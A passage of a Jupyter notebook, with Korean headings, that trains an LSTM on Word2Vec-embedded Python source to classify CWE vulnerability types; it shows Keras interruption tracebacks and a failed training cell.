            "\u001b[0;32m/tmp/ipython-input-1563915152.py\u001b[0m in \u001b[0;36m<cell line: 0>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     68\u001b[0m     \u001b[0;31m# Adjusted epochs and batch_size for sample data\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 69\u001b[0;31m     \u001b[0mhistory_binary\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mmodel_binary\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX_train_binary\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my_train_binary\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mepochs\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m15\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbatch_size\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m16\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalidation_split\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m0.2\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mverbose\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     70\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/keras/src/utils/traceback_utils.py\u001b[0m in \u001b[0;36merror_handler\u001b[0;34m(*args, **kwargs)\u001b[0m\n\u001b[1;32m    116\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 117\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    118\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/keras/src/backend/tensorflow/trainer.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, x, y, batch_size, epochs, verbose, callbacks, validation_split, validation_data, shuffle, class_weight, sample_weight, initial_epoch, steps_per_epoch, validation_steps, validation_batch_size, validation_freq)\u001b[0m\n\u001b[1;32m    400\u001b[0m                     )\n\u001b[0;32m--> 401\u001b[0;31m                 val_logs = self.evaluate(\n\u001b[0m\u001b[1;32m    402\u001b[0m                     \u001b[0mx\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mval_x\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/keras/src/utils/traceback_utils.py\u001b[0m in \u001b[0;36merror_handler\u001b[0;34m(*args, **kwargs)\u001b[0m\n\u001b[1;32m    116\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 117\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    118\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/keras/src/backend/tensorflow/trainer.py\u001b[0m in \u001b[0;36mevaluate\u001b[0;34m(self, x, y, batch_size, verbose, sample_weight, steps, callbacks, return_dict, **kwargs)\u001b[0m\n\u001b[1;32m    486\u001b[0m         \u001b[0;32mwith\u001b[0m \u001b[0mepoch_iterator\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcatch_stop_iteration\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 487\u001b[0;31m             \u001b[0;32mfor\u001b[0m \u001b[0mstep\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0miterator\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mepoch_iterator\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    488\u001b[0m                 \u001b[0mcallbacks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mon_test_batch_begin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstep\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/keras/src/backend/tensorflow/trainer.py\u001b[0m in \u001b[0;36m__next__\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    739\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m__next__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 740\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mnext\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_epoch_iterator\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    741\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/keras/src/trainers/epoch_iterator.py\u001b[0m in \u001b[0;36m_enumerate_iterator\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    110\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_current_iterator\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m \u001b[0;32mor\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msteps_per_epoch\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 111\u001b[0;31m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_current_iterator\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0miter\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_get_iterator\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    112\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_steps_seen\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/tensorflow/python/data/ops/dataset_ops.py\u001b[0m in \u001b[0;36m__iter__\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    500\u001b[0m       \u001b[0;32mwith\u001b[0m \u001b[0mops\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcolocate_with\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_variant_tensor\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 501\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0miterator_ops\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mOwnedIterator\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    502\u001b[0m     \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/tensorflow/python/data/ops/iterator_ops.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, dataset, components, element_spec)\u001b[0m\n\u001b[1;32m    708\u001b[0m             \"not be specified.\")\n\u001b[0;32m--> 709\u001b[0;31m       \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_create_iterator\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdataset\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    710\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/tensorflow/python/data/ops/iterator_ops.py\u001b[0m in \u001b[0;36m_create_iterator\u001b[0;34m(self, dataset)\u001b[0m\n\u001b[1;32m    747\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_iterator_resource\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mop\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexperimental_set_type\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mfulltype\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 748\u001b[0;31m       \u001b[0mgen_dataset_ops\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmake_iterator\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mds_variant\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_iterator_resource\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    749\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/tensorflow/python/ops/gen_dataset_ops.py\u001b[0m in \u001b[0;36mmake_iterator\u001b[0;34m(dataset, iterator, name)\u001b[0m\n\u001b[1;32m   3477\u001b[0m     \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 3478\u001b[0;31m       _result = pywrap_tfe.TFE_Py_FastPathExecute(\n\u001b[0m\u001b[1;32m   3479\u001b[0m         _ctx, \"MakeIterator\", name, dataset, iterator)\n",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m: ",
            "\nDuring handling of the above exception, another exception occurred:\n",
            "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mshowtraceback\u001b[0;34m(self, exc_tuple, filename, tb_offset, exception_only, running_compiled_code)\u001b[0m\n\u001b[1;32m   2098\u001b[0m                         \u001b[0;31m# in the engines. This should return a list of strings.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2099\u001b[0;31m                         \u001b[0mstb\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_render_traceback_\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2100\u001b[0m                     \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mAttributeError\u001b[0m: 'KeyboardInterrupt' object has no attribute '_render_traceback_'",
            "\nDuring handling of the above exception, another exception occurred:\n",
            "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
            "    \u001b[0;31m[... skipping hidden 1 frame]\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mshowtraceback\u001b[0;34m(self, exc_tuple, filename, tb_offset, exception_only, running_compiled_code)\u001b[0m\n\u001b[1;32m   2099\u001b[0m                         \u001b[0mstb\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_render_traceback_\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2100\u001b[0m                     \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2101\u001b[0;31m                         stb = self.InteractiveTB.structured_traceback(etype,\n\u001b[0m\u001b[1;32m   2102\u001b[0m                                             value, tb, tb_offset=tb_offset)\n\u001b[1;32m   2103\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1365\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1366\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtb\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1367\u001b[0;31m         return FormattedTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1368\u001b[0m             self, etype, value, tb, tb_offset, number_of_lines_of_context)\n\u001b[1;32m   1369\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, value, tb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1265\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mmode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mverbose_modes\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1266\u001b[0m             \u001b[0;31m# Verbose modes need a full traceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1267\u001b[0;31m             return VerboseTB.structured_traceback(\n\u001b[0m\u001b[1;32m   1268\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtb_offset\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mnumber_of_lines_of_context\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1269\u001b[0m             )\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mstructured_traceback\u001b[0;34m(self, etype, evalue, etb, tb_offset, number_of_lines_of_context)\u001b[0m\n\u001b[1;32m   1122\u001b[0m         \u001b[0;34m\"\"\"Return a nice text document describing the traceback.\"\"\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1123\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1124\u001b[0;31m         formatted_exception = self.format_exception_as_a_whole(etype, evalue, etb, number_of_lines_of_context,\n\u001b[0m\u001b[1;32m   1125\u001b[0m                                                                tb_offset)\n\u001b[1;32m   1126\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mformat_exception_as_a_whole\u001b[0;34m(self, etype, evalue, etb, number_of_lines_of_context, tb_offset)\u001b[0m\n\u001b[1;32m   1080\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1081\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1082\u001b[0;31m         \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfind_recursion\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0morig_etype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1083\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1084\u001b[0m         \u001b[0mframes\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat_records\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mlast_unique\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecursion_repeat\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/IPython/core/ultratb.py\u001b[0m in \u001b[0;36mfind_recursion\u001b[0;34m(etype, value, records)\u001b[0m\n\u001b[1;32m    380\u001b[0m     \u001b[0;31m# first frame (from in to out) that looks different.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    381\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mis_recursion_error\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0metype\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 382\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mrecords\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    383\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    384\u001b[0m     \u001b[0;31m# Select filename, lineno, func_name to track frames with\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mTypeError\u001b[0m: object of type 'NoneType' has no len()"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# df 전체에 대해 수행"
      ],
      "metadata": {
        "id": "9WZlCNQjQjGn"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 단일 모델"
      ],
      "metadata": {
        "id": "E3hjljnPQrOa"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 221
        },
        "id": "564dcfbc",
        "outputId": "51ec7661-4888-480f-f9ad-b148a4a57e72"
      },
      "source": [
        "# Apply tokenization, embedding, and padding to the 'source' column of the full df\n",
        "\n",
        "# 1. Tokenize the 'source' column\n",
        "df['tokenized_source'] = df['source'].apply(tokenize_python)\n",
        "\n",
        "# 2. Embed the tokenized sequences using the loaded Word2Vec model\n",
        "if w2v_model:\n",
        "    df['embedded_source'] = embed_sequences(df['tokenized_source'].tolist(), w2v_model)\n",
        "else:\n",
        "    print(\"Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "    df['embedded_source'] = None # Or handle appropriately\n",
        "\n",
        "# 3. Pad the embedded sequences\n",
        "if w2v_model and df['embedded_source'] is not None:\n",
        "    max_sequence_length = 100 # Use the same max length as before\n",
        "    embedding_dim = w2v_model.vector_size\n",
        "\n",
        "    padded_embedded_sequences = []\n",
        "    for embedded_sequence in df['embedded_source']:\n",
        "        if embedded_sequence.size > 0:\n",
        "            padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "            if padding_length > 0:\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                padded_sequence = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "            else:\n",
        "                padded_sequence = embedded_sequence[:max_sequence_length]\n",
        "        else:\n",
        "            padded_sequence = np.zeros((max_sequence_length, embedding_dim))\n",
        "\n",
        "        padded_embedded_sequences.append(padded_sequence)\n",
        "\n",
        "    df['padded_embedded_source'] = padded_embedded_sequences\n",
        "    print(\"\\nExample of padded embedded sequence shape (full df):\")\n",
        "    if padded_embedded_sequences:\n",
        "        print(padded_embedded_sequences[0].shape)\n",
        "\n",
        "elif df['embedded_source'] is None:\n",
        "    print(\"Embedding step failed. Cannot proceed with padding.\")\n",
        "\n",
        "# Prepare the data for LSTM (using the full df)\n",
        "if 'padded_embedded_source' in df.columns:\n",
        "    X_full = np.array(df['padded_embedded_source'].tolist())\n",
        "    y_full = df['CWE']\n",
        "\n",
        "    # Encode the labels to numerical values\n",
        "    label_encoder_full = LabelEncoder()\n",
        "    y_encoded_full = label_encoder_full.fit_transform(y_full)\n",
        "\n",
        "    # Convert numerical labels to one-hot encoded vectors\n",
        "    y_one_hot_full = to_categorical(y_encoded_full)\n",
        "\n",
        "    # Determine the number of classes (should be the same as before)\n",
        "    num_classes_full = y_one_hot_full.shape[1]\n",
        "\n",
        "    # Split the data into training and testing sets\n",
        "    X_train_full, X_test_full, y_train_full, y_test_full = train_test_split(\n",
        "        X_full, y_one_hot_full, test_size=0.2, random_state=42\n",
        "    )\n",
        "\n",
        "    # Define the LSTM model architecture (using the same structure as before)\n",
        "    model_full = Sequential()\n",
        "    model_full.add(LSTM(128, input_shape=(max_sequence_length, embedding_dim)))\n",
        "    model_full.add(Dense(num_classes_full, activation='softmax'))\n",
        "\n",
        "    # Compile the model\n",
        "    model_full.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\n",
        "\n",
        "    # Print model summary\n",
        "    print(\"\\nFull dataset model summary:\")\n",
        "    model_full.summary()\n",
        "\n",
        "    # Train the model\n",
        "    print(\"\\nTraining model on full dataset...\")\n",
        "    history_full = model_full.fit(X_train_full, y_train_full, epochs=10, batch_size=32, validation_split=0.2)\n",
        "\n",
        "    # Evaluate the model on the test set\n",
        "    loss_full, accuracy_full = model_full.evaluate(X_test_full, y_test_full, verbose=0)\n",
        "    print(f\"\\nTest Accuracy (full dataset): {accuracy_full*100:.2f}%\")\n",
        "\n",
        "else:\n",
        "    print(\"Padded embedded source not available. Cannot train model on full dataset.\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "NameError",
          "evalue": "name 'tokenize_python' is not defined",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
            "\u001b[0;32m/tmp/ipython-input-3121521423.py\u001b[0m in \u001b[0;36m<cell line: 0>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;31m# 1. Tokenize the 'source' column\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m \u001b[0mdf\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'tokenized_source'\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdf\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'source'\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mapply\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtokenize_python\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;31m# 2. Embed the tokenized sequences using the loaded Word2Vec model\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mNameError\u001b[0m: name 'tokenize_python' is not defined"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Select a random row from the original df DataFrame\n",
        "random_row = df.sample(1).iloc[0]\n",
        "\n",
        "# Get the actual CWE label and keyword\n",
        "actual_cwe = random_row['CWE']\n",
        "actual_keyword = random_row['keyword']\n",
        "\n",
        "# Get the source code\n",
        "source_code = random_row['source']\n",
        "\n",
        "# Preprocess the source code: tokenize, embed, and pad\n",
        "tokenized_code = tokenize_python(source_code)\n",
        "\n",
        "# Ensure w2v_model was loaded successfully\n",
        "if w2v_model:\n",
        "    embedded_code = embed_sequences([tokenized_code], w2v_model) # embed_sequences expects a list of sequences\n",
        "    if embedded_code and len(embedded_code) > 0 and embedded_code[0].size > 0:\n",
        "        # Pad the embedded sequence\n",
        "        max_sequence_length = 100 # Use the same max length as training\n",
        "        embedding_dim = w2v_model.vector_size\n",
        "        padded_code = np.zeros((max_sequence_length, embedding_dim)) # Initialize with zeros\n",
        "\n",
        "        embedded_sequence = embedded_code[0]\n",
        "        if embedded_sequence.shape[0] > 0:\n",
        "            # Calculate padding needed\n",
        "            padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "            if padding_length > 0:\n",
        "                # Create padding of zero vectors\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                # Concatenate original sequence with padding\n",
        "                padded_code = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "            else:\n",
        "                # Truncate if sequence is longer than max_sequence_length\n",
        "                padded_code = embedded_sequence[:max_sequence_length]\n",
        "\n",
        "        # Reshape for prediction (add batch dimension)\n",
        "        padded_code = np.expand_dims(padded_code, axis=0)\n",
        "\n",
        "        # Make a prediction using the trained model\n",
        "        if 'model_full' in locals() and model_full is not None: # Changed from 'model' to 'model_full'\n",
        "            prediction = model_full.predict(padded_code) # Changed from model.predict to model_full.predict\n",
        "            predicted_class_index = np.argmax(prediction, axis=1)[0]\n",
        "\n",
        "            # Convert the predicted class index back to the CWE label\n",
        "            # Ensure label_encoder_full was fitted in the previous step (using full dataset)\n",
        "            if 'label_encoder_full' in locals(): # Changed from 'label_encoder' to 'label_encoder_full'\n",
        "                predicted_cwe = label_encoder_full.inverse_transform([predicted_class_index])[0] # Changed from label_encoder to label_encoder_full\n",
        "\n",
        "                print(f\"Actual CWE: {actual_cwe} (Keyword: {actual_keyword})\")\n",
        "                print(f\"Predicted CWE: {predicted_cwe}\")\n",
        "            else:\n",
        "                print(\"Error: label_encoder_full not found. Cannot convert predicted index to label.\")\n",
        "        else:\n",
        "            print(\"Error: LSTM model_full not found. Please train the model on the full dataset first.\")\n",
        "    else:\n",
        "        print(\"Error: Could not embed the source code.\")\n",
        "else:\n",
        "    print(\"Error: Word2Vec model not loaded. Cannot embed sequences.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
